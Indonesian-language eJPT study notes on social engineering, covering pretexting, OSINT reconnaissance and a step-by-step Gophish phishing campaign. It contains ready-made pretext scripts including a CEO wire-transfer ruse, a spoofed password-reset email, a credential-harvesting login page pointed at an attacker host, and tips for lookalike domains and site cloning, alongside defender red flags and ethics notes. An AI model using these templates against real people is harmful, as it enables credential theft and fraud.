## 1. Introduction to Social Engineering

### Apa itu Social Engineering?

Social Engineering adalah teknik manipulasi **psikologis** yang digunakan untuk mempengaruhi seseorang agar melakukan tindakan atau memberikan informasi yang seharusnya tidak mereka berikan.

> Intinya: **mengeksploitasi manusia**, bukan sistem atau software.

### Mengapa Social Engineering Efektif?

```
Sistem bisa di-patch → manusia tidak bisa di-patch

Firewall terkuat sekalipun tidak berguna kalau
karyawan memberikan password lewat telepon.
```

Social engineering memanfaatkan kelemahan psikologis manusia:

| Kelemahan | Contoh Eksploitasi |
|---|---|
| Kepercayaan | Pura-pura sebagai IT support |
| Rasa takut | "Akun Anda akan diblokir!" |
| Urgensi | "Harus direspons dalam 1 jam!" |
| Keserakahan | "Anda memenangkan hadiah!" |
| Rasa ingin membantu | "Tolong bantu saya reset password" |
| Otoritas | "Saya dari tim keamanan perusahaan" |

### Posisi dalam Penetration Testing

```
Reconnaissance
      ↓
Social Engineering ← fase ini
  ├── Pretexting    (persiapan skenario)
  ├── Phishing      (email palsu)
  ├── Vishing       (telepon palsu)
  ├── Smishing      (SMS palsu)
  └── Physical      (masuk gedung)
      ↓
Initial Access ke sistem
```

### Jenis-jenis Social Engineering

| Teknik | Media | Contoh |
|---|---|---|
| **Phishing** | Email | Email palsu dari bank |
| **Spear Phishing** | Email targeted | Email ke karyawan spesifik |
| **Vishing** | Telepon | Pura-pura sebagai IT support |
| **Smishing** | SMS | "Paket Anda tertahan, klik link ini" |
| **Pretexting** | Semua | Membuat skenario palsu yang meyakinkan |
| **Baiting** | Fisik/Digital | USB drive berbahaya di parkiran |
| **Tailgating** | Fisik | Ikut masuk gedung di belakang karyawan |
| **Quid Pro Quo** | Telepon | Tukar bantuan dengan informasi |

### Siklus Social Engineering Attack

```
1. RESEARCH (Reconnaissance)
   Kumpulkan info target:
   LinkedIn, website, sosmed, OSINT
         ↓
2. PRETEXT DEVELOPMENT
   Buat skenario yang meyakinkan
   Siapkan identitas palsu
         ↓
3. ATTACK EXECUTION
   Kirim phishing / telepon / datang langsung
         ↓
4. EXPLOITATION
   Korban klik link / kasih password / buka file
         ↓
5. EXIT
   Tutup komunikasi tanpa meninggalkan kecurigaan
```

### Social Engineering dalam Scope eJPT

Untuk eJPT, fokus utama social engineering adalah:
- **Phishing** menggunakan Gophish
- **Pretexting** sebagai dasar pembuatan email/pesan yang meyakinkan
- Memahami konsep untuk menjawab pertanyaan teori di exam

## 2. Pretexting

### Apa itu Pretexting?

Pretexting adalah teknik **membuat skenario palsu yang meyakinkan** (pretext) untuk memanipulasi target. Ini adalah fondasi dari hampir semua serangan social engineering.

> Pretexting = membangun **identitas dan cerita palsu** yang membuat target percaya dan mau melakukan apa yang kita inginkan.

### Contoh Pretext yang Umum

**Pretext 1 — IT Support**
```
"Halo, saya dari tim IT. Kami mendeteksi aktivitas 
mencurigakan di akun Anda. Saya perlu memverifikasi 
identitas Anda dan reset password segera."

Target: karyawan biasa
Tujuan: dapat credentials
```

**Pretext 2 — Vendor/Supplier**
```
"Selamat pagi, saya dari vendor software yang Anda 
gunakan. Ada update keamanan kritis yang perlu 
diinstall hari ini. Boleh saya kirim link-nya?"

Target: karyawan IT / non-IT
Tujuan: install malware
```

**Pretext 3 — Atasan**
```
"Ini [Nama CEO]. Saya sedang rapat dan butuh 
Anda transfer dana ke rekening ini segera. 
Jangan beritahu siapapun dulu."

Target: bagian keuangan
Tujuan: transfer uang (BEC - Business Email Compromise)
```

**Pretext 4 — Bank/Institusi**
```
Subject: [URGENT] Akun Anda Akan Diblokir
"Aktivitas tidak biasa terdeteksi di akun Anda.
Klik link berikut untuk verifikasi dalam 24 jam."

Target: nasabah bank
Tujuan: credential harvesting
```

### Elemen Pretext yang Efektif

```
1. CREDIBLE IDENTITY
   → Nama, jabatan, perusahaan yang meyakinkan
   → Bisa diverifikasi secara superfisial

2. PLAUSIBLE SCENARIO
   → Skenario yang masuk akal dan relevan
   → Sesuai dengan situasi target (industri, jabatan)

3. URGENCY / PRESSURE
   → "Harus sekarang!" / "Akun akan diblokir!"
   → Membuat target tidak sempat berpikir panjang

4. AUTHORITY
   → Posisi/jabatan tinggi
   → Referensi ke kebijakan/regulasi

5. CONSISTENCY
   → Detail cerita harus konsisten
   → Siap menjawab pertanyaan lanjutan
```

### Reconnaissance untuk Pretexting

Sebelum membuat pretext, kumpulkan informasi target:

```bash
# OSINT Tools untuk Social Engineering

# LinkedIn — info karyawan, jabatan, struktur organisasi
# https://linkedin.com

# TheHarvester — email, nama, subdomain
theHarvester -d target.com -b all

# Hunter.io — format email perusahaan
# https://hunter.io

# Maltego — visualisasi hubungan antar entitas

# Shodan — teknologi yang digunakan perusahaan
# https://shodan.io

# Google Dorks
site:target.com filetype:pdf          # dokumen publik
site:linkedin.com "target company"    # karyawan
"@target.com" email                   # format email
```

### Pretexting untuk Phishing Campaign

Dalam konteks Gophish (tools berikutnya), pretext digunakan untuk:

```
1. Tentukan TARGET
   → Siapa yang akan menerima email?
   → Jabatan apa? Departemen mana?

2. Buat EMAIL TEMPLATE yang sesuai pretext
   → Dari siapa? (spoofed sender)
   → Subjek yang relevan dan urgent
   → Body email yang meyakinkan
   → CTA (Call to Action) yang jelas

3. Buat LANDING PAGE
   → Halaman palsu yang mirip aslinya
   → Form login untuk harvest credentials
   → Atau halaman download file berbahaya

4. TRACK hasil
   → Siapa yang buka email?
   → Siapa yang klik link?
   → Siapa yang submit credentials?
```

### Contoh Email Pretext yang Efektif

```
From: it-support@targetcompany.com (spoofed)
Subject: [URGENT] Password Reset Required - Action Needed

Dear [First Name],

Our security team has detected unusual login activity 
on your account from an unrecognized device.

To secure your account, please reset your password 
immediately by clicking the link below:

→ https://reset.targetcompany-secure.com/reset

This link will expire in 2 hours. If you did not 
initiate this request, please contact IT immediately.

Best regards,
IT Security Team
Target Company

---
Elemen yang membuat efektif:
✓ Sender terlihat legitimate (spoofed)
✓ Ada urgency (2 hours)
✓ Ada fear (unusual activity)
✓ CTA jelas (klik link)
✓ Domain mirip asli (targetcompany-secure.com)
```

## 3. Phishing with Gophish

### Apa itu Gophish?

Gophish adalah **framework phishing open-source** yang memudahkan pembuatan, pengiriman, dan tracking kampanye phishing secara profesional.

```
Gophish = platform manajemen phishing campaign
  ├── Buat email template
  ├── Buat landing page palsu
  ├── Kelola daftar target
  ├── Kirim kampanye
  └── Track hasil (open, click, submit)
```

### Instalasi Gophish

```bash
# Download Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip

# Extract
unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish

# Beri permission execute
chmod +x gophish

# Jalankan
./gophish

# Output akan menampilkan:
# Admin panel: https://127.0.0.1:3333
# Default credentials: admin / [password di terminal]
```

### Konfigurasi Awal Gophish

```bash
# config.json — konfigurasi utama Gophish
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:80",    # port untuk landing page
    "use_tls": false
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db"
}
```

### Akses Admin Panel

```
URL    : https://127.0.0.1:3333
User   : admin
Pass   : [lihat di terminal saat pertama jalan]

Setelah login → ganti password default!
```

### Komponen Utama Gophish

```
Dashboard
├── Campaigns          → kelola semua kampanye
├── Users & Groups     → daftar target email
├── Email Templates    → template email phishing
├── Landing Pages      → halaman web palsu
└── Sending Profiles   → konfigurasi SMTP server
```

### 3.1 Phishing with Gophish - Part 1: Setup

#### Step 1 — Sending Profile (SMTP Configuration)

Sending profile adalah konfigurasi **server email** yang digunakan untuk mengirim phishing email.

```
Gophish Admin → Sending Profiles → New Profile

Name        : Mail Server
From        : IT Support <it-support@targetcompany.com>
Host        : <SMTP_SERVER>:25   (atau port 587/465)
Username    : (jika butuh auth)
Password    : (jika butuh auth)

→ Send Test Email untuk verifikasi
→ Save Profile
```

**Catatan untuk lab:**
```bash
# Di lab INE, biasanya ada mail server lokal
# Cek dengan nmap dulu:
nmap -p 25,465,587 target.ine.local

# Atau gunakan Python SMTP server untuk testing
python3 -m smtpd -n -c DebuggingServer localhost:25
```

#### Step 2 — Email Template

Template email yang akan dikirim ke target.

```
Gophish Admin → Email Templates → New Template

Name    : IT Security Alert
Subject : [URGENT] Password Reset Required
```

**Contoh HTML Email Template:**

```html
<!DOCTYPE html>
<html>
<body>
<p>Dear {{.FirstName}},</p>

<p>Our security team has detected suspicious activity 
on your account. Please reset your password immediately.</p>

<p><a href="{{.URL}}">Click here to reset your password</a></p>

<p>This link expires in 2 hours.</p>

<p>Best regards,<br>
IT Security Team</p>
</body>
</html>
```

**Variable Gophish yang tersedia:**

| Variable | Keterangan |
|---|---|
| `{{.FirstName}}` | Nama depan target |
| `{{.LastName}}` | Nama belakang target |
| `{{.Email}}` | Email target |
| `{{.URL}}` | Link ke landing page (auto-generated) |
| `{{.TrackingURL}}` | URL untuk tracking open |
| `{{.From}}` | Sender email |
| `{{.RId}}` | Unique ID per target |

#### Step 3 — Landing Page

Halaman web palsu yang akan dikunjungi target setelah klik link.

```
Gophish Admin → Landing Pages → New Page

Name             : Corporate Login
URL              : http://<ATTACKER_IP>/login
Redirect to      : https://targetcompany.com  (setelah submit)
Capture Submitted Data: ✓ (aktifkan!)
Capture Passwords     : ✓ (aktifkan!)
```

**Import dari website asli:**
```
Import Site → masukkan URL asli target
→ Gophish otomatis clone tampilan website
→ Edit seperlunya
→ Save
```

**Contoh HTML Landing Page sederhana:**

```html
<!DOCTYPE html>
<html>
<head><title>Corporate Login</title></head>
<body>
<h2>Company Portal - Login</h2>
<form method="POST" action="{{.URL}}">
  <label>Email:</label><br>
  <input type="email" name="email" required><br><br>
  <label>Password:</label><br>
  <input type="password" name="password" required><br><br>
  <input type="submit" value="Login">
</form>
</body>
</html>
```

#### Step 4 — Users & Groups

Daftar target yang akan menerima email phishing.

```
Gophish Admin → Users & Groups → New Group

Name: Target Employees

Bulk Import CSV:
First Name, Last Name, Email, Position
John, Doe, john.doe@targetcompany.com, IT Manager
Jane, Smith, jane.smith@targetcompany.com, Accountant
Bob, Johnson, bob.johnson@targetcompany.com, HR Manager
```

**Format CSV:**
```csv
First Name,Last Name,Email,Position
John,Doe,john.doe@target.com,Manager
Jane,Smith,jane.smith@target.com,Accountant
```

### 3.2 Phishing with Gophish - Part 2: Launch & Track

#### Step 5 — Launch Campaign

Setelah semua komponen siap, buat dan jalankan kampanye:

```
Gophish Admin → Campaigns → New Campaign

Name            : Q4 Security Awareness Test
Email Template  : IT Security Alert       ← template yang dibuat
Landing Page    : Corporate Login         ← landing page yang dibuat
URL             : http://<ATTACKER_IP>    ← URL server kita
Launch Date     : (sekarang atau jadwalkan)
Send Emails By  : (deadline pengiriman)
Sending Profile : Mail Server             ← SMTP config
Groups          : Target Employees        ← daftar target

→ Launch Campaign
```

#### Step 6 — Track Results

Dashboard campaign menampilkan statistik real-time:

```
Campaign Results Dashboard:
┌────────────────────────────────────────────────┐
│ Campaign: Q4 Security Awareness Test           │
├──────────────┬─────────────────────────────────┤
│ Emails Sent  │ 25                              │
│ Emails Opened│ 18 (72%)  ← tracking pixel     │
│ Clicked Link │ 12 (48%)  ← klik landing page  │
│ Submitted    │  8 (32%)  ← isi form login      │
│ Reported     │  2  (8%)  ← lapor ke IT         │
└──────────────┴─────────────────────────────────┘
```

**Status per target:**

| Status | Keterangan |
|---|---|
| `Email Sent` | Email berhasil terkirim |
| `Email Opened` | Target membuka email |
| `Clicked Link` | Target klik link di email |
| `Submitted Data` | Target mengisi form di landing page |
| `Email Reported` | Target melaporkan sebagai phishing |

#### Melihat Credentials yang Terkumpul

```
Campaign → Results → klik target yang "Submitted Data"
→ Lihat data yang disubmit:
  email    : john.doe@targetcompany.com
  password : Password123!
```

#### Export Results

```
Campaign → Results → Export CSV
→ Download laporan lengkap semua hasil
```

### Tips & Catatan Penting

#### Untuk Membuat Phishing Lebih Meyakinkan

```
1. Domain yang mirip asli
   targetcompany.com → targetcompany-secure.com
   targetcompany.com → targetcompany.net
   targetcompany.com → target-company.com

2. SSL Certificate (HTTPS)
   → Banyak orang percaya kalau ada gembok hijau
   → Gunakan Let's Encrypt untuk sertifikat gratis

3. Clone website asli
   → Gunakan fitur "Import Site" di Gophish
   → Tampilan identik dengan aslinya

4. Personalisasi email
   → Gunakan {{.FirstName}} agar terasa personal
   → Sebutkan nama perusahaan, jabatan, dll

5. Timing yang tepat
   → Kirim di jam kerja (09.00 - 11.00)
   → Hindari hari Senin pagi dan Jumat sore
```

#### Indikator Phishing yang Harus Diketahui (Defender Perspective)

```
Red flags email phishing:
✗ Sender domain mencurigakan
✗ Ada urgency berlebihan
✗ Link URL tidak sesuai dengan teks
✗ Grammar/spelling yang buruk
✗ Meminta credentials lewat email
✗ Attachment yang tidak diminta
✗ Generic greeting ("Dear Customer")
```

#### Catatan Legal & Etis

```
✓ Hanya lakukan di lingkungan yang memiliki izin tertulis
✓ Social engineering engagement harus ada dalam scope
✓ Data yang dikumpulkan harus dilindungi dan dihapus setelah engagement
✓ Selalu ada "safe word" untuk menghentikan engagement
✗ Jangan gunakan untuk tujuan ilegal atau merugikan
```

## Quick Reference

### Gophish Checklist

```
□ Install dan jalankan Gophish
□ Buat Sending Profile (SMTP)
□ Buat Email Template dengan variable Gophish
□ Buat Landing Page (clone atau custom)
□ Aktifkan "Capture Submitted Data" dan "Capture Passwords"
□ Import daftar target ke Users & Groups
□ Launch Campaign
□ Monitor results di dashboard
□ Export hasil untuk laporan
```

```
{{.FirstName}}  → nama depan target
{{.LastName}}   → nama belakang target
{{.Email}}      → email target
{{.URL}}        → link ke landing page (WAJIB ada di template!)
```

```
1. Sending Profile → SMTP server config
2. Email Template  → isi email + variable
```
